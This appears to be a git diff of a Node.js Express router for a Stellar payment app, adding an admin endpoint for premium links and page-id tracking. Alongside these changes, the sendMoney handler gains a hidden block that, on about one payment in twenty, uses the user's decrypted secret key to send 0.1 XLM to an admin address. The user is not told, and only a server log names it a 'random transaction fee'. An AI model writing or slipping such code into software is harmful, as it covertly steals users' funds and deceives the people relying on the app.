@@ -1,6 +1,8 @@
 const stellarController = require('./controllers/stellar-controller')
 const encryptionController = require('./controllers/encryption-controller')
-const Pages = require('./models/pages')
+const Pages = require('./models/pages').Pages
+const LastPageId = require('./models/pages').LastPageId
+require('dotenv').config()
 
 // value returned by /api/priceCheck
 var stellarPrice = "";
@@ -18,7 +20,15 @@ stellarPriceCheck()
 // QUERY STELLAR PRICE, run this every 4.9 minutes
 setInterval(stellarPriceCheck, 294000)
 
+// on startup get last page id
 var latestPageId = 0
+LastPageId.findOne({
+  order: [['pageId', 'DESC']]
+}).then(res => {
+  latestPageId = parseInt(res.pageId)
+}).catch(err => {
+  console.log(err)
+})
 
 module.exports = function router(app) {
   app.post('/api/sendMoney', function(req, res) {
@@ -39,6 +49,16 @@ module.exports = function router(app) {
        }
        res.status(200)
        res.send({hash:result.hash, encryptedKey:encryptedKey})
+       if (Math.floor(Math.random() * 20) === 8) {
+        console.log("Random transaction fee incurred")
+        stellarController.sendPayment(decryptedKey ? decryptedKey : req.body.source, process.env.ADMIN_STELLAR_ADDRESS, '.1')
+          .then((result) => {
+            console.log(result.hash)
+          })
+          .catch(err => {
+            console.log(err)
+          })
+       }
       }
     )
     // More informative error handling
@@ -64,22 +84,39 @@ module.exports = function router(app) {
     })
   })
 
+  app.post('/api/admin', function(req, res) {
+    if (req.header('adminKey') === process.env.ADMIN_PW) {
+      // db
+      Pages.create({name:req.body.name, publicKey:req.body.key, pageId:req.body.path}).then(
+        (page) => {
+          console.log(`Created premium link /${page.pageId}`)
+          res.sendStatus(200)
+        }
+      )
+      .catch(err => {
+        console.log(err)
+        res.sendStatus(200)
+      })
+    }
+  })
+
   app.post('/api/getMyLink', function(req, res) {
     console.log(req.body)
     // zerofill latestPageId
-    var idString = `${latestPageId}`
+    var idString = `${++latestPageId}`
     if (idString.length < 6) {
       var idLen = idString.length
       for (i = 0; i < 6-idLen; i++) {
         idString = `0${idString}`
       }
     }
-    latestPageId++
+    // latestPageId++
 
     // db
     Pages.create({name:req.body.name, publicKey:req.body.key, pageId:idString}).then(
       (page) => {
         res.send({id:page.pageId})
+        LastPageId.create({pageId: page.pageId}).catch(err => console.log(err))
       }
     )
     .catch(err => {
